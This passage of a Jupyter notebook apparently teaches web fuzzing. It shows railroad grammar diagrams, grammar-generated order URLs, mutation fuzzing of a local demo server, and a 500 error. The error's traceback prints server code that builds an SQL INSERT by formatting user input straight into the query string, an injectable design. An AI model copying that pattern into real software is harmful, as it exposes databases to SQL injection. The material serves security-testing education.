       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"92\" viewBox=\"0 0 225.0 92\" width=\"225.0\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 51v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 61h0.0\"/><path d=\"M185.0 61h0.0\"/><path d=\"M40.0 61a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M60.0 31h8.5\"/><path d=\"M156.5 31h8.5\"/><g class=\"terminal\">\n",
       "<path d=\"M68.5 31h0.0\"/><path d=\"M156.5 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"88.0\" x=\"68.5\" y=\"20\"/><text x=\"112.5\" y=\"35\">Jane+Doe</text></g></g><path d=\"M165.0 31a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M40.0 61h20\"/><g>\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M165.0 61h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M165.0 61h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"105.0\" x=\"60.0\" y=\"50\"/><text x=\"112.5\" y=\"65\">John+Smith</text></g></g><path d=\"M165.0 61h20\"/></g><path d=\"M 185.0 61 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "email\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"92\" viewBox=\"0 0 318.5 92\" width=\"318.5\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 51v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 61h0.0\"/><path d=\"M278.5 61h0.0\"/><path d=\"M40.0 61a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M60.0 31h8.5\"/><path d=\"M250.0 31h8.5\"/><g class=\"terminal\">\n",
       "<path d=\"M68.5 31h0.0\"/><path d=\"M250.0 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"181.5\" x=\"68.5\" y=\"20\"/><text x=\"159.25\" y=\"35\">j.doe%40example.com</text></g></g><path d=\"M258.5 31a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M40.0 61h20\"/><g>\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M258.5 61h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M258.5 61h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"198.5\" x=\"60.0\" y=\"50\"/><text x=\"159.25\" y=\"65\">j_smith%40example.com</text></g></g><path d=\"M258.5 61h20\"/></g><path d=\"M 278.5 61 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "city\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"92\" viewBox=\"0 0 208.0 92\" width=\"208.0\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 51v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 61h0.0\"/><path d=\"M168.0 61h0.0\"/><path d=\"M40.0 61a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M60.0 31h4.25\"/><path d=\"M143.75 31h4.25\"/><g class=\"terminal\">\n",
       "<path d=\"M64.25 31h0.0\"/><path d=\"M143.75 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"79.5\" x=\"64.25\" y=\"20\"/><text x=\"104.0\" y=\"35\">Seattle</text></g></g><path d=\"M148.0 31a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M40.0 61h20\"/><g>\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M148.0 61h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M148.0 61h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"88.0\" x=\"60.0\" y=\"50\"/><text x=\"104.0\" y=\"65\">New+York</text></g></g><path d=\"M148.0 61h20\"/></g><path d=\"M 168.0 61 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "zip\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"62\" viewBox=\"0 0 512.5 62\" width=\"512.5\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 21v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 31h0.0\"/><path d=\"M472.5 31h0.0\"/><path d=\"M40.0 31h20\"/><g>\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M452.5 31h0.0\"/><g class=\"non-terminal\">\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M122.5 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"60.0\" y=\"20\"/><text x=\"91.25\" y=\"35\">digit</text></g><path d=\"M122.5 31h10\"/><path d=\"M132.5 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M142.5 31h0.0\"/><path d=\"M205.0 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"142.5\" y=\"20\"/><text x=\"173.75\" y=\"35\">digit</text></g><path d=\"M205.0 31h10\"/><path d=\"M215.0 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M225.0 31h0.0\"/><path d=\"M287.5 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"225.0\" y=\"20\"/><text x=\"256.25\" y=\"35\">digit</text></g><path d=\"M287.5 31h10\"/><path d=\"M297.5 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M307.5 31h0.0\"/><path d=\"M370.0 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"307.5\" y=\"20\"/><text x=\"338.75\" y=\"35\">digit</text></g><path d=\"M370.0 31h10\"/><path d=\"M380.0 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M390.0 31h0.0\"/><path d=\"M452.5 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"390.0\" y=\"20\"/><text x=\"421.25\" y=\"35\">digit</text></g></g><path d=\"M452.5 31h20\"/></g><path d=\"M 472.5 31 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "digit\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"109\" viewBox=\"0 0 522.5 109\" width=\"522.5\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 59v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 69h0.0\"/><path d=\"M482.5 69h0.0\"/><path d=\"M40.0 69a10 10 0 0 0 10 -10v-29a10 10 0 0 1 10 -10h324.0\"/><path d=\"M138.5 89h324.0a10 10 0 0 0 10 -10v0a10 10 0 0 1 10 -10\"/><path d=\"M40.0 69h10\"/><g>\n",
       "<path d=\"M50.0 69h0.0\"/><path d=\"M118.5 69h0.0\"/><path d=\"M50.0 69a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M70.0 39h0.0\"/><path d=\"M98.5 39h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M70.0 39h0.0\"/><path d=\"M98.5 39h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"70.0\" y=\"28\"/><text x=\"84.25\" y=\"43\">0</text></g></g><path d=\"M98.5 39a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M50.0 69h20\"/><g>\n",
       "<path d=\"M70.0 69h0.0\"/><path d=\"M98.5 69h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M70.0 69h0.0\"/><path d=\"M98.5 69h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"70.0\" y=\"58\"/><text x=\"84.25\" y=\"73\">1</text></g></g><path d=\"M98.5 69h20\"/></g><path d=\"M118.5 69a10 10 0 0 1 10 10v0a10 10 0 0 0 10 10\"/><path d=\"M118.5 20a10 10 0 0 1 10 10v29a10 10 0 0 0 10 10\"/><g>\n",
       "<path d=\"M138.5 69h0.0\"/><path d=\"M207.0 69h0.0\"/><path d=\"M138.5 69a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M158.5 39h0.0\"/><path d=\"M187.0 39h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M158.5 39h0.0\"/><path d=\"M187.0 39h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"158.5\" y=\"28\"/><text x=\"172.75\" y=\"43\">2</text></g></g><path d=\"M187.0 39a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M138.5 69h20\"/><g>\n",
       "<path d=\"M158.5 69h0.0\"/><path d=\"M187.0 69h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M158.5 69h0.0\"/><path d=\"M187.0 69h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"158.5\" y=\"58\"/><text x=\"172.75\" y=\"73\">3</text></g></g><path d=\"M187.0 69h20\"/></g><path d=\"M207.0 69a10 10 0 0 1 10 10v0a10 10 0 0 0 10 10\"/><path d=\"M207.0 20a10 10 0 0 1 10 10v29a10 10 0 0 0 10 10\"/><g>\n",
       "<path d=\"M227.0 69h0.0\"/><path d=\"M295.5 69h0.0\"/><path d=\"M227.0 69a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M247.0 39h0.0\"/><path d=\"M275.5 39h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M247.0 39h0.0\"/><path d=\"M275.5 39h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"247.0\" y=\"28\"/><text x=\"261.25\" y=\"43\">4</text></g></g><path d=\"M275.5 39a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M227.0 69h20\"/><g>\n",
       "<path d=\"M247.0 69h0.0\"/><path d=\"M275.5 69h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M247.0 69h0.0\"/><path d=\"M275.5 69h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"247.0\" y=\"58\"/><text x=\"261.25\" y=\"73\">5</text></g></g><path d=\"M275.5 69h20\"/></g><path d=\"M295.5 69a10 10 0 0 1 10 10v0a10 10 0 0 0 10 10\"/><path d=\"M295.5 20a10 10 0 0 1 10 10v29a10 10 0 0 0 10 10\"/><g>\n",
       "<path d=\"M315.5 69h0.0\"/><path d=\"M384.0 69h0.0\"/><path d=\"M315.5 69a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M335.5 39h0.0\"/><path d=\"M364.0 39h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M335.5 39h0.0\"/><path d=\"M364.0 39h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"335.5\" y=\"28\"/><text x=\"349.75\" y=\"43\">6</text></g></g><path d=\"M364.0 39a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M315.5 69h20\"/><g>\n",
       "<path d=\"M335.5 69h0.0\"/><path d=\"M364.0 69h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M335.5 69h0.0\"/><path d=\"M364.0 69h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"335.5\" y=\"58\"/><text x=\"349.75\" y=\"73\">7</text></g></g><path d=\"M364.0 69h20\"/></g><path d=\"M384.0 69a10 10 0 0 1 10 10v0a10 10 0 0 0 10 10\"/><path d=\"M384.0 20a10 10 0 0 1 10 10v29a10 10 0 0 0 10 10\"/><g>\n",
       "<path d=\"M404.0 69h0.0\"/><path d=\"M472.5 69h0.0\"/><path d=\"M404.0 69a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M424.0 39h0.0\"/><path d=\"M452.5 39h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M424.0 39h0.0\"/><path d=\"M452.5 39h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"424.0\" y=\"28\"/><text x=\"438.25\" y=\"43\">8</text></g></g><path d=\"M452.5 39a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M404.0 69h20\"/><g>\n",
       "<path d=\"M424.0 69h0.0\"/><path d=\"M452.5 69h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M424.0 69h0.0\"/><path d=\"M452.5 69h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"424.0\" y=\"58\"/><text x=\"438.25\" y=\"73\">9</text></g></g><path d=\"M452.5 69h20\"/></g><path d=\"M472.5 69h10\"/></g><path d=\"M 482.5 69 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "syntax_diagram(ORDER_GRAMMAR)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Using [one of our grammar fuzzers](GrammarFuzzer.iynb), we can instantiate this grammar and generate URLs:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.210472Z",
     "iopub.status.busy": "2021-12-13T14:45:34.209799Z",
     "iopub.status.idle": "2021-12-13T14:45:34.506157Z",
     "shell.execute_reply": "2021-12-13T14:45:34.506781Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from GrammarFuzzer import GrammarFuzzer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.515709Z",
     "iopub.status.busy": "2021-12-13T14:45:34.514995Z",
     "iopub.status.idle": "2021-12-13T14:45:34.518038Z",
     "shell.execute_reply": "2021-12-13T14:45:34.518413Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=New+York&zip=42436',\n",
       " '/order?item=drill&name=John+Smith&email=j_smith%40example.com&city=New+York&zip=56213',\n",
       " '/order?item=drill&name=Jane+Doe&email=j_smith%40example.com&city=Seattle&zip=63628',\n",
       " '/order?item=drill&name=John+Smith&email=j.doe%40example.com&city=Seattle&zip=59538',\n",
       " '/order?item=drill&name=Jane+Doe&email=j_smith%40example.com&city=New+York&zip=41160']"
      ]
     },
     "execution_count": 82,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "order_fuzzer = GrammarFuzzer(ORDER_GRAMMAR)\n",
    "[order_fuzzer.fuzz() for i in range(5)]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Sending these URLs to the server will have them processed correctly:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.522855Z",
     "iopub.status.busy": "2021-12-13T14:45:34.522268Z",
     "iopub.status.idle": "2021-12-13T14:45:34.533329Z",
     "shell.execute_reply": "2021-12-13T14:45:34.533775Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:34] INSERT INTO orders VALUES ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:34] \"GET /order?item=lockset&name=Jane+Doe&email=j_smith%40example.com&city=Seattle&zip=16631 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook Lock Set</strong> to Jane Doe in Seattle, 16631<br>\n",
       "  A confirmation mail will be sent to j_smith@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 83,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz())))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.537090Z",
     "iopub.status.busy": "2021-12-13T14:45:34.536496Z",
     "iopub.status.idle": "2021-12-13T14:45:34.538862Z",
     "shell.execute_reply": "2021-12-13T14:45:34.539235Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104'), ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631')]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Fuzzing with Unexpected Values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can now see that the server does a good job when faced with \"standard\" values.  But what happens if we feed it non-standard values?  To this end, we make use of a [mutation fuzzer](MutationFuzzer.ipynb) which inserts random changes into the URL.  Our seed (i.e. the value to be mutated) comes from the grammar fuzzer:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.543863Z",
     "iopub.status.busy": "2021-12-13T14:45:34.543276Z",
     "iopub.status.idle": "2021-12-13T14:45:34.545536Z",
     "shell.execute_reply": "2021-12-13T14:45:34.545946Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'"
      ]
     },
     "execution_count": 85,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "seed = order_fuzzer.fuzz()\n",
    "seed"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Mutating this string yields mutations not only in the field values, but also in field names as well as the URL structure."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.549209Z",
     "iopub.status.busy": "2021-12-13T14:45:34.548687Z",
     "iopub.status.idle": "2021-12-13T14:45:34.550520Z",
     "shell.execute_reply": "2021-12-13T14:45:34.551369Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from MutationFuzzer import MutationFuzzer  # minor deoendency"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.556468Z",
     "iopub.status.busy": "2021-12-13T14:45:34.555754Z",
     "iopub.status.idle": "2021-12-13T14:45:34.558921Z",
     "shell.execute_reply": "2021-12-13T14:45:34.559422Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',\n",
       " '/order?item=drill&name=Jane+Doe&email=.doe%40example.com&city=Seattle&zip=45732',\n",
       " '/order?item=drill;&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',\n",
       " '/order?item=drill&name=Jane+Doe&emil=j.doe%40example.com&city=Seattle&zip=45732',\n",
       " '/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=4732']"
      ]
     },
     "execution_count": 87,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "mutate_order_fuzzer = MutationFuzzer([seed], min_mutations=1, max_mutations=1)\n",
    "[mutate_order_fuzzer.fuzz() for i in range(5)]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us fuzz a little until we get an internal server error.  We use the Python `requests` module to interact with the Web server such that we can directly access the HTTP status code."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.563607Z",
     "iopub.status.busy": "2021-12-13T14:45:34.563016Z",
     "iopub.status.idle": "2021-12-13T14:45:34.580627Z",
     "shell.execute_reply": "2021-12-13T14:45:34.581138Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "while True:\n",
    "    path = mutate_order_fuzzer.fuzz()\n",
    "    url = urljoin(httpd_url, path)\n",
    "    r = requests.get(url)\n",
    "    if r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "That didn't take long.  Here's the offending URL:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.584767Z",
     "iopub.status.busy": "2021-12-13T14:45:34.584196Z",
     "iopub.status.idle": "2021-12-13T14:45:34.586490Z",
     "shell.execute_reply": "2021-12-13T14:45:34.586856Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://127.0.0.1:8800/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'"
      ]
     },
     "execution_count": 89,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.589932Z",
     "iopub.status.busy": "2021-12-13T14:45:34.589406Z",
     "iopub.status.idle": "2021-12-13T14:45:34.598992Z",
     "shell.execute_reply": "2021-12-13T14:45:34.599366Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:34] \"GET /order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732 HTTP/1.1\" 500 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:34] Traceback (most recent call last):\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/739974898.py\", line 8, in do_GET\n",
       "    self.handle_order()\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/1342827050.py\", line 4, in handle_order\n",
       "    self.store_order(values)\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/1382513861.py\", line 5, in store_order\n",
       "    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
       "KeyError: 'name'\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
